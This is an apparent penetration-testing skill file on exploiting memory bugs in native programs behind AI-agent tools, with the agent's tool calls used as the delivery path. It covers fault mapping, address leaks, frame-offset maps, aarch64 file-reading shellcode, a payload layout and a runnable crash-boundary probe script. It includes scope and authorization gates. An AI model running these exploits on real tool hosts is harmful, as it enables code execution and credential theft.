---
name: hunt-agent-native-memory
description: "Memory-safety exploitation of the NATIVE program behind an agent tool — stack/heap overflow, pointer and length-field corruption, leaked addresses in tool output, and ret2shellcode/ROP through an MCP or function-calling interface. Use when a tool wraps a compiled binary, a legacy service, or any non-managed runtime (C/C++/Rust-unsafe/CGO), when a tool echoes raw pointers or crashes on large input, or when an upload size cap looks suspiciously tight. The LLM is only the delivery path; the finding is code execution in the tool host."
sources: arkx_ctf(field-validated), owasp_llm_top10_2025, owasp_agentic_asi_2026, mitre_atlas, cwe
report_count: 1
validated_against: "overflow boundary + address disclosure CONFIRMED re-runnably in the validation lab (`lab/exploits/exploit_native_memory.py`: reproducible 65-byte boundary, address leaked, service verified still alive afterwards). stack overflow through an MCP file-store tool: fread() sized by the source file, RWX stack, non-PIE, ASLR off, buffer address printed in the tool response — ret2shellcode read the target secret and returned it on the tool's stdout (ARKX Smashed File Manager)"
---

# Hunt Agent Native Memory Corruption

Most agent tools are Python/TypeScript wrappers, but a meaningful minority shell out to a **compiled binary** — a legacy converter, an image/QR decoder, a parser, an in-house C service, a vendored CLI. The agent hands that binary attacker-controlled bytes and hands you back its stdout. That is a classic memory-safety target with two unusual advantages: the tool **prints the binary's output back to you** (a free crash/leak oracle), and the agent's own input validation (a 20-char name filter, an extension check) is often the *only* control anybody wrote.

This class is not "the model said something." The finding is **code execution inside the tool host**, with the agent's file access, network position and credentials.

## Where This Lives / Attack Surface Signals
- Tool output looks like a **program banner**, a `%p` pointer, a `perror()` string, or a libc exception (`HTTPConnectionPool`, `Segmentation fault`, `*** stack smashing detected ***`).
- Tool descriptions naming a **converter / parser / decoder / packer / archiver / legacy system** — media, QR/barcode, PDF, DICOM, firmware, CAD, EDI.
- Input **size caps that are oddly specific** (600 bytes, 4 KB) — a cap just above a buffer size is a hint, not a defense.
- The tool **truncates its own output** on certain inputs (the process died before the final line) — a free crash oracle.
- A `debug`/`status`/`info` tool that volunteers build or hardening posture ("ASLR disabled", version, arch).
- Upload → process pipelines where the file is passed by path to a subprocess.

## Crown Jewel Targets
Code execution in the process that holds the agent's **service credentials, cloud role, internal network position and mounted data**. In enterprises the tool host is usually more privileged than the chat user: it can reach internal APIs, the secrets manager, and cloud IMDS. A single overflow converts "the copilot can convert files" into "attacker runs code in the copilot's VPC as its service identity."

## Characterize First
1. **Is a native process actually in the loop?** Banner text, pointer formats, libc error strings, exit-code semantics, arch mentioned by a debug tool. A pure-Python tool raises Python tracebacks — different skill (`hunt-agent-deserialization`, `hunt-agent-tool-injection`).
2. **Get the binary if you can.** Agent platforms frequently ship the tool's own artifacts: enumerate `GET /openapi.json`, then any asset/static/download route, guessing the **program name from the banner** (`file_manager` → `/level/<n>/assets/file_manager`). Also check container images, npm/PyPI packages that vendor the binary, and public vendor downloads of the same version. *Static analysis turns a week of blind poking into an afternoon.*
3. **Hardening posture** — `objdump -p` / `readelf -lW` for `GNU_STACK` (`rwx` = executable stack), PIE vs fixed base, `-fno-stack-protector`, RELRO, and the compiler flags left in `.comment`. Confirm ASLR claims by **repeating the same request and comparing leaked addresses**.
4. **Establish the oracle before payloads** — what output appears on success vs on crash? Truncated output = process died at a known point; that boundary is your map.
5. **Rule out the easy paths first** — command injection (`;`, `|`, backticks, `$()` land verbatim in output = `execve` with an argv list, not a shell → not injectable) and path traversal. Don't reach for shellcode when `../` works.

## Technique 1 — Black-box fault mapping (byte-granular) [CONFIRMED]
Sweep input length and record a **binary oracle** (did the final success line appear?). Halve the interval until you have the exact byte offset where behaviour changes; then test **which value** matters at that offset, not just its presence.
```
len ≤ N        → OK
len N+1..N+8   → output truncated (crash)
N zeros + junk beyond → OK again          ← the field at N is a POINTER or length, not a canary
```
`Field example:` any non-zero byte at offset 544 killed the process, but **eight zero bytes there and junk beyond ran fine** — offset 544 was the input `FILE*`, later used by `if (fp) fclose(fp)`. Zeroing it skipped the `fclose` and kept the process alive long enough to return. Reading a corrupted pointer is the most common "canary" that isn't one.

## Technique 2 — Address leaks in tool output [CONFIRMED]
Tools built for humans print diagnostics; the agent relays them verbatim. A single `%p` defeats ASLR for the whole exploit.
```
"File read buffer is at 0xfffffffff7d8"
```
Check **stability across runs** (ASLR off → identical) and **what shifts it** — argv and environment sit above the stack frames, so a longer tool argument moves every stack address. Pin the variable parts (use a fixed 1-char name; note that a UUID path is fixed-length) and the leak stays valid.

## Technique 3 — Overwrite the reachable saved state [CONFIRMED]
Recover the frame layout from the disassembly and map offsets **from the overflowed buffer**, not from `sp`:
```
sub sp, sp, #0x360 ; stp x29, x30, [sp]     ← saved LR at the BOTTOM: unreachable from this buffer
buf at sp+0x138  →  in-FILE* at sp+0x358  = buf+544
                 →  caller's frame at sp+0x360 = buf+552  (caller's saved x29, x30 at +560)
```
When the callee saves its own return address *below* the buffer, you cannot smash it — but the **caller's** saved return address sits just past the end of the callee frame and is usually still in range. `fread(buf, 1, size, fp)` with `size` taken from the source file is the canonical bug: the count comes from the attacker, never from `sizeof(buf)`.

## Technique 4 — ret2shellcode when the stack is RWX [CONFIRMED]
`GNU_STACK ... flags rwx` + non-PIE + a leaked buffer address = jump straight into the input.
Write shellcode that **prints to stdout**, because stdout is the tool's return channel to the agent — you get the output back in chat without needing egress:
```asm
        adr  x1, path            // aarch64: openat / read / write / exit
        movn x0, #99             // AT_FDCWD
        mov  x2, xzr ; mov x3, xzr ; mov x8, #56 ; svc #0
        mov  x1, <scratch> ; mov x2, #200 ; mov x8, #63 ; svc #0   // read
        mov  x2, x0 ; mov x0, #1 ; mov x8, #64 ; svc #0            // write(1, ...)
        mov  x0, #0  ; mov x8, #93 ; svc #0                        // exit
path:   .asciz "<target_file>"
```
Payload = `shellcode || padding || <zeroed pointer field> || <saved frame> || <address of buffer>`, kept inside the tool's own upload cap. Assemble for the **target arch, not yours** (a debug tool announcing "ARM64" is the tell; on macOS, `clang -c -arch arm64` emits identical aarch64 encodings).

## Technique 5 — ROP / GOT when the stack is NX [REFERENCE]
Executable stacks are rare in modern builds. Fall back to: ROP with gadgets from a fixed-base binary (non-PIE makes this tractable), `mprotect`-then-jump, partial-overwrite of a saved pointer when only a few bytes are in range, GOT overwrite under partial RELRO, or `__free_hook`/`FILE`-vtable style heap work. All standard binary exploitation — the only agent-specific part is that the *delivery* is a tool call and the *output* is chat.

## Technique 6 — Corrupt data, not control flow [REFERENCE]
Often easier and quieter than PC control: overwrite an adjacent **path/filename buffer** (turn a write into a write-elsewhere), a **length or index** field (turn a bounded copy into an unbounded one), a **mode string** (`"rb"` → `"wb"`), or a **privilege/verified flag** in a neighbouring struct. Prefer these when only a few bytes are reachable.

## Verification & False-Positive Gate
1. **Self-description is untrusted** — a debug tool claiming "ASLR disabled" or a given version is *generated or stale text*. Prove it by effect: repeat the request and diff the leaked addresses.
2. **Verify the channel discriminates** — establish success-output vs crash-output on known-good and known-bad inputs before reading anything into a result.
3. **Marker-fired ≠ data-fired** — a crash is not code execution. Only shellcode that returns a value you asked for (a marker string, then the real artifact) proves execution.
4. **Reproduce ≥3×** — heap/stack layout can vary with argv, env, and concurrency; report hit-rate if it is not 100%. Re-verify the leaked address every run.
5. **OOB-or-it-didn't-happen** — if the proof is an outbound connection rather than stdout, the listener must receive your marker plus real data.
6. **Refusal ≠ secure; a crash ≠ RCE; "it segfaulted" ≠ impact.** A denial-of-service on the tool host is a real but *different* (lower) finding — report it as DoS, not as execution.
7. **Actioned secret** — anything the shellcode reads must be validated the same way as any other extraction (it authenticates / verifiably belongs to another tenant).
8. **Minimum-necessary extraction** — prove execution with `id`/a single file, then stop. Do not spawn shells, persist, or pivot without written scope. **Crashing a shared tool host is a production outage** — get explicit authorization for the fault-mapping sweep, run it against a non-production instance where possible, and record the exact inputs sent so the client can reproduce and clean up.

### Negative-Result Gate (before reporting "clean")
A probe that reports clean because it never looked is the more common failure, and it reaches the
client as "we tested it and found nothing". Before any negative:
1. **A control proves the probe could fire** — plant a known-true case, see it detected in the same run.
2. **Denylist read-only tools; never allowlist the dangerous ones** — an allowlist ignores what it has not heard of.
3. **Errors are their own verdict** — 5xx / timeout / empty read = UNMEASURABLE, never "refused".
4. **Prove the plant persisted** before reporting isolation — no memory to cross means no result.
5. **Tokenise identifiers at ONE character** — ids are routinely a single digit.
6. **Word boundaries; normalise whitespace before subtracting** — substrings invent findings, verbatim matching deletes them.
7. **A fixed-size effect is not proof; a SCALING one is** — constant overhead is an extra model turn, not execution.
8. **Judge tuning by whether a GENUINE detection dropped**, not by the false-positive count.
9. **Do not inherit another tool's verdict** — benchmarks and scanners carry their own bugs.

## Common Root Causes
Length taken from the attacker-controlled source (file size, header field) instead of `sizeof(dest)`; unsafe `strcpy`/`sprintf`/`fread`/`memcpy` in a legacy component nobody re-audited; a binary built without stack protector / PIE / NX because it "only ever ran locally"; diagnostics printing raw pointers; validation implemented in the **wrapper** (name length, extension) while the binary is assumed to be trusted; the tool host running unsandboxed with the agent's own credentials; and shipping the tool's binary or source from an unauthenticated artifact route.

## Impact & Severity
- **CRITICAL:** code execution in the tool host → the agent's service credentials, cloud role, internal network, and mounted data. Escalate per `ai-agent-methodology` Phase 4 (IMDS, secrets manager, lateral).
- **HIGH:** arbitrary file read/write as the tool identity, or reliable control of the instruction pointer without a full chain.
- **MEDIUM:** memory disclosure (pointers, adjacent buffer contents) or a data-only corruption that flips an authorization/limit field.
- **LOW/INFO:** reproducible crash (DoS of the tool host) with no primitive — still worth reporting, scored as availability.

## Mapping
- OWASP LLM Top 10 (2025): **LLM06 Excessive Agency** (unvalidated user bytes reach a native program), **LLM05** for the reflected raw output; **LLM03 Supply Chain** when the vulnerable binary is a vendored third-party component.
- OWASP Agentic Apps (ASI, 2026): tool-execution abuse / unexpected code execution; runtime supply chain when the binary is third-party.
- CSA MAESTRO: L3 (tool/agent framework), L4 (deployment/infrastructure).
- MITRE ATLAS (v5.6.0): **AML.T0053 AI Agent Tool Invocation** as the delivery, then **AML.T0050 Command and Scripting Interpreter** for the execution.
- CWE-121/122 (stack/heap overflow), CWE-787 (out-of-bounds write), CWE-733/732 (executable stack, missing hardening), CWE-200 (address disclosure).

`Field example:` reproduced deterministically in `lab/` — a record parser with a fixed 64-byte buffer and no bounds check. Binary search located a **reproducible boundary at 65 bytes**, and the fault message disclosed `0x7ffd3ab41c90`, which is what turns a crash into an ASLR defeat for a follow-on. Two gate checks matter more than the crash: the boundary is re-confirmed, and the service is re-tested with a short input afterwards — a host that stopped answering is UNMEASURABLE, not a finding. Gate: `python3 lab/run_lab.py`.

## Runnable Probe [self-contained]
```python
#!/usr/bin/env python3
# Crash-boundary + leaked-pointer sweep against an upload/store tool.
# Prints: the byte offset where behaviour flips (pointer/canary), and any leaked address.
# deps: stdlib only.  Set TARGET_UPLOAD + TARGET_CHAT + COOKIE for your engagement.
import json, re, urllib.request

TARGET_UPLOAD = "https://target/level/1/upload"   # multipart field "file"
TARGET_CHAT   = "https://target/level/1/chat"      # {"message": "..."} -> tool output
COOKIE        = "sessionId=REPLACE"

def _post(url, data, headers):
    r = urllib.request.Request(url, data=data, headers=headers, method="POST")
    return urllib.request.urlopen(r, timeout=60).read().decode("utf-8", "replace")

def upload(payload: bytes) -> str:
    b = "----p"; body = (
        f"--{b}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n").encode() + payload + f"\r\n--{b}--\r\n".encode()
    return json.loads(_post(TARGET_UPLOAD, body,
        {"Cookie": COOKIE, "Content-Type": f"multipart/form-data; boundary={b}"}))["file_id"]

def store(fid: str) -> str:
    return _post(TARGET_CHAT, json.dumps({"message": f'store name "x" file_id {fid}'}).encode(),
                 {"Cookie": COOKIE, "Content-Type": "application/json"})

OK = "Successfully"            # success sentinel; adjust to the tool's own
lo, hi = 8, 4096              # coarse-to-fine crash boundary
addr = None
while lo < hi:
    mid = (lo + hi) // 2
    out = store(upload(b"A" * mid))
    m = re.search(r"0x[0-9a-fA-F]{6,}", out)
    if m: addr = m.group(0)
    (lo := mid + 1) if OK in out else (hi := mid)   # first non-OK length = crash boundary
if lo >= hi:
    print("[ERROR] no boundary found in range — either the target never crashed (no finding) or it"
          " stopped answering (unmeasured). Re-send the SHORTEST input and confirm a normal reply"
          " before reporting either."); raise SystemExit(1)
print(f"[+] crash boundary ~offset {lo} bytes | leaked address: {addr or 'none'}")
# LETHAL WHEN: at the found offset you overwrite the SAVED RETURN ADDRESS (frame below the buffer)
# and, with the leaked addr + an RWX/non-PIE binary from /assets, redirect it into your shellcode —
# proven by the tool's stdout returning your marker/file read, not merely a crash (that is DoS).
```

## Related Skills
`hunt-agent-tool-injection` (check command/code injection FIRST — cheaper and usually present) · `hunt-agent-deserialization` (the managed-runtime equivalent) · `hunt-agent-mcp-exposure` (finding the artifact/asset routes that hand you the binary) · `hunt-agent-info-disclosure` (what the resulting file read reaches) · `hunt-agent-blind-exfil` (getting output back when stdout is not returned) · `ai-agent-methodology` · `redteam-mindset`. Defenses/detection: `DEFENSES-AND-DETECTION.md`.
